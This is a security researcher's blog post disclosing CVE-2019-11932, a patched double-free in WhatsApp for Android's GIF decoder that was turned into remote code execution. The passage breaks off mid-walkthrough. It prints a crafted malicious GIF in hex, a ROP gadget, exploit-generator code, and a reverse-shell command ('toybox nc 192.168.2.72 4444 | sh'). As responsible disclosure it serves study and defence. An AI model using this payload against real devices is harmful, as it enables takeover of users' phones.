@@ -1,0 +1,978 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.11.1 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>How a double-free bug in WhatsApp turns to RCE - Home</title>
+<meta name="description" content="In this blog post, I’m going to share about a double-free vulnerability that I discovered in WhatsApp for Android, and how I turned it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. Facebook reserved CVE-2019-11932 for this issue.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Home">
+<meta property="og:title" content="How a double-free bug in WhatsApp turns to RCE">
+<meta property="og:url" content="https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/">
+
+
+  <meta property="og:description" content="In this blog post, I’m going to share about a double-free vulnerability that I discovered in WhatsApp for Android, and how I turned it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. Facebook reserved CVE-2019-11932 for this issue.">
+
+
+
+  <meta property="og:image" content="https://awakened1712.github.io/assets/img/whatsapp.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-10-02T04:24:15+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Awakened",
+      "url": "https://awakened1712.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Home Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single landing">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Home</a>
+        <ul class="visible-links">
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://awakened1712.github.io/categories/#programming" >Programming</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://awakened1712.github.io/categories/#hacking" >Hacking</a>
+            </li>
+          
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        
+        <a href="/about/">
+          <img src="/assets/img/avatar1.jpg" alt="Awakened" itemprop="image">
+        </a>
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <a href="/about/"><h3 class="author__name" itemprop="name">Awakened</h3></a>
+    
+    
+      <p class="author__bio" itemprop="description">
+        a security researcher
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Singapore</span>
+        </li>
+      
+
+      
+        <li>
+          <a href="/about/" itemprop="url">
+            <i class="fas fa-fw fa-link" aria-hidden="true"></i> Website
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="mailto:awakened.1712@gmail.com">
+            <meta itemprop="email" content="awakened.1712@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="How a double-free bug in WhatsApp turns to RCE">
+    <meta itemprop="description" content="In this blog post, I’m going to share about a double-free vulnerability that I discovered in WhatsApp for Android, and how I turned it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. Facebook reserved CVE-2019-11932 for this issue.">
+    <meta itemprop="datePublished" content="October 02, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">How a double-free bug in WhatsApp turns to RCE
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  14 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On This Page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#demo">Demo</a></li>
+  <li><a href="#double-free-vulnerability-in-ddgifslurp-in-decodingc-in-libpl_droidsonroids_gif">Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif</a></li>
+  <li><a href="#controlling-pc-register">Controlling PC register</a></li>
+  <li><a href="#dealing-with-aslr-and-wx">Dealing with ASLR and W^X</a></li>
+  <li><a href="#putting-everything-together">Putting everything together</a></li>
+  <li><a href="#affected-versions">Affected versions</a></li>
+  <li><a href="#attack-vectors">Attack vectors</a></li>
+</ul>
+            </nav>
+          </aside>
+        
+        <p>In this blog post, I’m going to share about a double-free vulnerability that I discovered in WhatsApp for Android, and how I turned it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. Facebook reserved CVE-2019-11932 for this issue.</p>
+
+<p>WhatsApp users, please do update to latest WhatsApp version (2.19.244 or above) to stay safe from this bug.</p>
+
+<h2 id="demo">Demo</h2>
+
+<p><a href="https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view">https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view</a></p>
+
+<p>Google Drive link to download if the above link is not accessible <a href="https://drive.google.com/open?id=1X9nBlf5oj5ef2UoYGOfusjxAiow8nKEK">https://drive.google.com/open?id=1X9nBlf5oj5ef2UoYGOfusjxAiow8nKEK</a></p>
+
+<p>The steps are as below:</p>
+<ul>
+  <li>0:16 Attacker sends GIF file to user via any channels
+    <ul>
+      <li>One of them could be as Document via WhatsApp (i.e. pressing the Paper Clip button and choose Document to send the corrupted GIF)</li>
+      <li>If the attacker is in the contact list of the user (i.e. a friend), the corrupted GIF is downloaded automatically without any user interaction.</li>
+    </ul>
+  </li>
+  <li>0:24 User wants to send a media file to any of his/her WhatsApp friend. So the user presses on the Paper clip button and opens the WhatsApp Gallery to choose a media file to send to his friend.
+    <ul>
+      <li>Take note that the user does not have to send anything because just opening the WhatsApp Gallery will trigger the bug. No additional touch after pressing WhatsApp Gallery is necessary.</li>
+    </ul>
+  </li>
+  <li>0:30 Since WhatsApp shows previews of every media (including the GIF file received), it will trigger the double-free bug and our RCE exploit.</li>
+</ul>
+
+<h2 id="double-free-vulnerability-in-ddgifslurp-in-decodingc-in-libpl_droidsonroids_gif">Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif</h2>
+
+<p>When a WhatsApp user opens Gallery view in WhatsApp to send a media file, WhatsApp parses it with a native library called <code class="language-plaintext highlighter-rouge">libpl_droidsonroids_gif.so</code> to generate the preview of the GIF file. <code class="language-plaintext highlighter-rouge">libpl_droidsonroids_gif.so</code> is an open-source library with source codes available at <a href="https://github.com/koral--/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c">https://github.com/koral–/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c</a>.</p>
+
+<p>A GIF file contains multiple encoded frames. To store the decoded frames, a buffer with name rasterBits is used. If all frames have the same size, rasterBits is re-used to store the decoded frames without re-allocation. However, rasterBits would be re-allocated if one of three conditions below is met:</p>
+
+<ul>
+  <li>width * height &gt; originalWidth * originalHeight</li>
+  <li>width - originalWidth &gt; 0</li>
+  <li>height - originalHeight &gt; 0</li>
+</ul>
+
+<p>Re-allocation is a combination of free and malloc. If the size of the re-allocation is 0, it is simply a free. Let say we have a GIF file that contains 3 frames that have sizes of 100, 0 and 0.</p>
+<ul>
+  <li>After the first re-allocation, we have <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> buffer of size 100.</li>
+  <li>In the second re-allocation of 0, <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> buffer is freed.</li>
+  <li>In the third re-allocation of 0, <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> is freed again.</li>
+</ul>
+
+<p>This results in a double-free vulnerability. The triggering location can be found in decoding.c:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int_fast32_t</span> <span class="n">widthOverflow</span> <span class="o">=</span> <span class="n">gifFilePtr</span><span class="o">-&gt;</span><span class="n">Image</span><span class="p">.</span><span class="n">Width</span> <span class="o">-</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">originalWidth</span><span class="p">;</span>
+<span class="kt">int_fast32_t</span> <span class="n">heightOverflow</span> <span class="o">=</span> <span class="n">gifFilePtr</span><span class="o">-&gt;</span><span class="n">Image</span><span class="p">.</span><span class="n">Height</span> <span class="o">-</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">originalHeight</span><span class="p">;</span>
+<span class="k">const</span> <span class="kt">uint_fast32_t</span> <span class="n">newRasterSize</span> <span class="o">=</span>
+        <span class="n">gifFilePtr</span><span class="o">-&gt;</span><span class="n">Image</span><span class="p">.</span><span class="n">Width</span> <span class="o">*</span> <span class="n">gifFilePtr</span><span class="o">-&gt;</span><span class="n">Image</span><span class="p">.</span><span class="n">Height</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">newRasterSize</span> <span class="o">&gt;</span> <span class="n">info</span><span class="o">-&gt;</span><span class="n">rasterSize</span> <span class="o">||</span> <span class="n">widthOverflow</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">||</span>
+    <span class="n">heightOverflow</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">tmpRasterBits</span> <span class="o">=</span> <span class="n">reallocarray</span><span class="p">(</span><span class="n">info</span><span class="o">-&gt;</span><span class="n">rasterBits</span><span class="p">,</span> <span class="n">newRasterSize</span><span class="p">,</span>     <span class="o">&lt;&lt;--</span> <span class="kt">double</span><span class="o">-</span><span class="n">free</span> <span class="n">here</span>
+                                       <span class="k">sizeof</span><span class="p">(</span><span class="n">GifPixelType</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">tmpRasterBits</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">gifFilePtr</span><span class="o">-&gt;</span><span class="n">Error</span> <span class="o">=</span> <span class="n">D_GIF_ERR_NOT_ENOUGH_MEM</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">info</span><span class="o">-&gt;</span><span class="n">rasterBits</span> <span class="o">=</span> <span class="n">tmpRasterBits</span><span class="p">;</span>
+    <span class="n">info</span><span class="o">-&gt;</span><span class="n">rasterSize</span> <span class="o">=</span> <span class="n">newRasterSize</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In Android, a double-free of a memory with size N leads to two subsequent memory-allocation of size N returning the same address.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(lldb) expr int $foo = (int) malloc(112)
+(lldb) p/x $foo
+(int) $14 = 0xd379b250
+ 
+(lldb) p (int)free($foo)
+(int) $15 = 0
+ 
+(lldb) p (int)free($foo)
+(int) $16 = 0
+ 
+(lldb) p/x (int)malloc(12)
+(int) $17 = 0xd200c350
+ 
+(lldb) p/x (int)malloc(96)
+(int) $18 = 0xe272afc0
+ 
+(lldb) p/x (int)malloc(180)
+(int) $19 = 0xd37c30c0
+ 
+(lldb) p/x (int)malloc(112)
+(int) $20 = 0xd379b250
+ 
+(lldb) p/x (int)malloc(112)
+(int) $21 = 0xd379b250
+</code></pre></div></div>
+
+<p>In the above snippet, variable $foo was freed twice. As a result, the next two allocations ($20 and $21) return the same address.</p>
+
+<p>Now look at struct GifInfo in gif.h</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">GifInfo</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">destructor</span><span class="p">)(</span><span class="n">GifInfo</span> <span class="o">*</span><span class="p">,</span> <span class="n">JNIEnv</span> <span class="o">*</span><span class="p">);</span>  <span class="o">&lt;&lt;--</span> <span class="n">there</span><span class="err">'</span><span class="n">s</span> <span class="n">a</span> <span class="n">function</span> <span class="n">pointer</span> <span class="n">here</span>
+    <span class="n">GifFileType</span> <span class="o">*</span><span class="n">gifFilePtr</span><span class="p">;</span>
+    <span class="n">GifWord</span> <span class="n">originalWidth</span><span class="p">,</span> <span class="n">originalHeight</span><span class="p">;</span>
+    <span class="kt">uint_fast16_t</span> <span class="n">sampleSize</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="n">lastFrameRemainder</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="n">nextStartTime</span><span class="p">;</span>
+    <span class="kt">uint_fast32_t</span> <span class="n">currentIndex</span><span class="p">;</span>
+    <span class="n">GraphicsControlBlock</span> <span class="o">*</span><span class="n">controlBlock</span><span class="p">;</span>
+    <span class="n">argb</span> <span class="o">*</span><span class="n">backupPtr</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="kt">long</span> <span class="n">startPos</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">rasterBits</span><span class="p">;</span>
+    <span class="kt">uint_fast32_t</span> <span class="n">rasterSize</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">comment</span><span class="p">;</span>
+    <span class="kt">uint_fast16_t</span> <span class="n">loopCount</span><span class="p">;</span>
+    <span class="kt">uint_fast16_t</span> <span class="n">currentLoop</span><span class="p">;</span>
+    <span class="n">RewindFunc</span> <span class="n">rewindFunction</span><span class="p">;</span>   <span class="o">&lt;&lt;--</span> <span class="n">there</span><span class="err">'</span><span class="n">s</span> <span class="n">another</span> <span class="n">function</span> <span class="n">pointer</span> <span class="n">here</span>
+    <span class="n">jfloat</span> <span class="n">speedFactor</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">stride</span><span class="p">;</span>
+    <span class="n">jlong</span> <span class="n">sourceLength</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">isOpaque</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">frameBufferDescriptor</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>We then craft a GIF file with three frames of below sizes:</p>
+<ul>
+  <li>sizeof(GifInfo)</li>
+  <li>0</li>
+  <li>0</li>
+</ul>
+
+<p>When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with size <code class="language-plaintext highlighter-rouge">sizeof(GifInfo)</code>. Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Because of the double-free behavior in Android, GifInfo <code class="language-plaintext highlighter-rouge">info</code> object and <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> will point to the same address. DDGifSlurp() will then decode the first frame to <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> buffer, thus overwriting <code class="language-plaintext highlighter-rouge">info</code> and its <code class="language-plaintext highlighter-rouge">rewindFunction()</code>, which is called right at the end of DDGifSlurp() function.</p>
+
+<h2 id="controlling-pc-register">Controlling PC register</h2>
+<p>The GIF file that we need to craft is as below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC 
+FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00 
+00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08 
+9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 F0 CE 57 2B 6F EE FF FF 2C 00 00 
+00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00 
+18 00 0A 00 0F 00 01 00 00 3B
+</code></pre></div></div>
+<p>It contains four frames:</p>
+<ul>
+  <li>Frame 1:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C 00 00 00 00 08 00 15 00 00 08 9C 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+F0 CE 57 2B 6F EE FF FF
+</code></pre></div>    </div>
+  </li>
+  <li>Frame 2:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C 00 00 00 00 1C 0F 00 00 00 00
+</code></pre></div>    </div>
+  </li>
+  <li>Frame 3:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C 00 00 00 00 1C 0F 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00
+</code></pre></div>    </div>
+  </li>
+  <li>Frame 4:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C 00 00 00 00 18 00 0A 00 0F 00 01 00 00
+</code></pre></div>    </div>
+    <p>The below sequence is what happened when WhatsApp Gallery is opened:</p>
+  </li>
+  <li>First parse:
+    <ul>
+      <li>Init:
+        <ul>
+          <li>GifInfo *info = malloc(168);</li>
+        </ul>
+      </li>
+      <li>Frame 1:
+        <ul>
+          <li>info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x8*0x15, 1);</li>
+        </ul>
+      </li>
+      <li>Frame 2:
+        <ul>
+          <li>info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x0*0xf1c, 1);</li>
+        </ul>
+      </li>
+      <li>Frame 3:
+        <ul>
+          <li>info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x0*0xf1c, 1);</li>
+        </ul>
+      </li>
+      <li>Frame 4:
+        <ul>
+          <li>does not matter, it is there to make this GIF file valid</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Second parse:
+    <ul>
+      <li>Init:
+        <ul>
+          <li>GifInfo *info = malloc(168);</li>
+        </ul>
+      </li>
+      <li>Frame 1:
+        <ul>
+          <li>info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x8*0x15, 1);</li>
+        </ul>
+      </li>
+      <li>Frame 2, 3, 4:
+        <ul>
+          <li>does not matter</li>
+        </ul>
+      </li>
+      <li>End:
+        <ul>
+          <li>info-&gt;rewindFunction(info);</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>Because of the double-free bug occuring in the first parse, <code class="language-plaintext highlighter-rouge">info</code> and <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> now points to the same location. With the first frame crafted as said, we could control rewindFunction and PC when <code class="language-plaintext highlighter-rouge">info-&gt;rewindFunction(info);</code> is called.
+Take note that the frames are all LZW encoded. We must use an LZW encoder to encode the frames. 
+The above GIF triggers crash as below:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--------- beginning of crash
+10-02 11:09:38.460 17928 18059 F libc    : Fatal signal 6 (SIGABRT), code -6 in tid 18059 (image-loader), pid 17928 (com.whatsapp)
+10-02 11:09:38.467  1027  1027 D QCOM PowerHAL: LAUNCH HINT: OFF
+10-02 11:09:38.494 18071 18071 I crash_dump64: obtaining output fd from tombstoned, type: kDebuggerdTombstone
+10-02 11:09:38.495  1127  1127 I /system/bin/tombstoned: received crash request for pid 17928
+10-02 11:09:38.497 18071 18071 I crash_dump64: performing dump of process 17928 (target tid = 18059)
+10-02 11:09:38.497 18071 18071 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+10-02 11:09:38.497 18071 18071 F DEBUG   : Build fingerprint: 'google/taimen/taimen:8.1.0/OPM1.171019.011/4448085:user/release-keys'
+10-02 11:09:38.497 18071 18071 F DEBUG   : Revision: 'rev_10'
+10-02 11:09:38.497 18071 18071 F DEBUG   : ABI: 'arm64'
+10-02 11:09:38.497 18071 18071 F DEBUG   : pid: 17928, tid: 18059, name: image-loader  &gt;&gt;&gt; com.whatsapp &lt;&lt;&lt;
+10-02 11:09:38.497 18071 18071 F DEBUG   : signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x0   0000000000000000  x1   000000000000468b  x2   0000000000000006  x3   0000000000000008
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x4   0000000000000000  x5   0000000000000000  x6   0000000000000000  x7   7f7f7f7f7f7f7f7f
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x8   0000000000000083  x9   0000000010000000  x10  0000007da3c81cc0  x11  0000000000000001
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x12  0000007da3c81be8  x13  ffffffffffffffff  x14  ff00000000000000  x15  ffffffffffffffff
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x16  00000055b111efa8  x17  0000007e2bb3452c  x18  0000007d8ba9bad8  x19  0000000000004608
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x20  000000000000468b  x21  0000000000000083  x22  0000007da3c81e48  x23  00000055b111f3f0
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x24  0000000000000040  x25  0000007d8bbff588  x26  00000055b1120670  x27  000000000000000b
+10-02 11:09:38.497 18071 18071 F DEBUG   :     x28  00000055b111f010  x29  0000007da3c81d00  x30  0000007e2bae9760
+10-02 11:09:38.497 18071 18071 F DEBUG   :     sp   0000007da3c81cc0  pc   0000007e2bae9788  pstate 0000000060000000
+10-02 11:09:38.499 18071 18071 F DEBUG   :
+10-02 11:09:38.499 18071 18071 F DEBUG   : backtrace:
+10-02 11:09:38.499 18071 18071 F DEBUG   :     #00 pc 000000000001d788  /system/lib64/libc.so (abort+120)
+10-02 11:09:38.499 18071 18071 F DEBUG   :     #01 pc 0000000000002fac  /system/bin/app_process64 (art::SignalChain::Handler(int, siginfo*, void*)+1012)
+10-02 11:09:38.499 18071 18071 F DEBUG   :     #02 pc 00000000000004ec  [vdso:0000007e2e4b0000]
+10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  &lt;unknown&gt;
+</code></pre></div></div>
+
+<h2 id="dealing-with-aslr-and-wx">Dealing with ASLR and W^X</h2>
+<p>After controlling the PC, we want to achieve remote code execution. In Android, we can not execute code on non-executable regions due to W^X (i.e. stack and heap). The easiest way to deal with W^X in our case is to execute the below command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("toybox nc 192.168.2.72 4444 | sh");
+</code></pre></div></div>
+<p>For that, we need PC to point to <code class="language-plaintext highlighter-rouge">system()</code> function in libc.so and X0 to point to <code class="language-plaintext highlighter-rouge">"toybox nc 192.168.2.72 4444 | sh"</code>.
+This cannot be done directly. We need to first let PC jumps to an intermediate gadget, which sets X0 to point to <code class="language-plaintext highlighter-rouge">"toybox nc 192.168.2.72 4444 | sh"</code> and jump to <code class="language-plaintext highlighter-rouge">system()</code>.
+From the disassembly code around <code class="language-plaintext highlighter-rouge">info-&gt;rewindFunction(info);</code>, we can see that both X0 and X19 point to <code class="language-plaintext highlighter-rouge">info-&gt;rasterBits</code> (or <code class="language-plaintext highlighter-rouge">info</code>, because they both point to the same location), while X8 is actually <code class="language-plaintext highlighter-rouge">info-&gt;rewindFunction</code>.</p>
+
+<p><img src="https://github.com/awakened1712/awakened1712.github.io/raw/master/assets/img/whatsapp1.PNG" alt="Disassembly around info-&gt;rewindFunction" /></p>
+
+<p>There is a gadget in libhwui.so that perfectly satisfies our purpose:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldr x8, [x19, #0x18]
+add x0, x19, #0x20
+blr x8
+</code></pre></div></div>
+<p>Let say the address of the above gadget is AAAAAAAA and the address of system() function is BBBBBBBB. The rasterBits buffer (frame 1) before LZW encoding look as below:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
+00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
+00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..
+</code></pre></div></div>
+<p>In a normal Android system, because every processes are spawned from Zygotes, even with ASLR our addresses AAAAAAAA and BBBBBBBB do not change if WhatsApp is killed and restarted. However, they cannot persist a system reboot. To have reliable AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is beyond scope of this blogpost.</p>
+
+<h2 id="putting-everything-together">Putting everything together</h2>
+
+<p>Just compile the code in <a href="https://github.com/awakened1712/CVE-2019-11932">this repo</a>. Note that the address of <code class="language-plaintext highlighter-rouge">system()</code> and the gadget must be replaced by the actual address found by an information disclosure vulnerability (which is not covered in this blog post).</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    /*
+    Gadget g1:
+        ldr x8, [x19, #0x18]
+        add x0, x19, #0x20
+        blr x8
+    */
+    size_t g1_loc = 0x7cb81f0954;  &lt;&lt;-- replace this
+    memcpy(buffer + 128, &amp;g1_loc, 8);
+
+    size_t system_loc = 0x7cb602ce84; &lt;&lt;-- replace this
+    memcpy(buffer + 24, &amp;system_loc, 8);
+</code></pre></div></div>
+
+<p>Run the code to generate the corrupted GIF file:</p>
